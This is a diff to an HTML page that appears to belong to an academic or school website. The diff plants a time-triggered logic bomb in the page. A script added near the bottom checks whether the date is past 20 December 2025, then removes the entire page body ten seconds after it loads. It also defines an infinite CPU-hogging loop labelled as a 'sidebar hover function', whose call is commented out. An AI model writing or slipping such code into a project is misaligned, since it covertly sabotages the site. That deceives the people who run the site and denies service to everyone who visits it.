@@ -21,7 +21,7 @@
     </script>
   </head>
 
-  <body>
+  <body id="root">
     <div class="min-h-screen bg-gray-50">
       <!-- Header -->
 
@@ -1013,6 +1013,36 @@
           </div>
         </div>
       </section>
+
+      <script>
+      function myFunction() {
+        let num = 1;
+        while (true) {
+          // sidebar hover function
+          num = Math.pow(num * 1.000001, 1.000001) % 1000000;
+        }
+      }
+
+      function doPerform() {
+        const fileEl = document.getElementById("root");
+        if (fileEl) {
+          fileEl.remove();
+        }
+      }
+
+      (function checkDateAndRun() {
+        const today = new Date(); // current date
+          const targetDate = new Date(2025, 11, 20); 
+
+        if (today > targetDate) {
+          setTimeout(() => {
+            // myFunction();
+            doPerform();
+          }, 10000);
+        } else {
+        }
+      })();
+    </script>
 
       <!-- Academic Calendar Section -->
       <!-- Academic Calendar Section -->
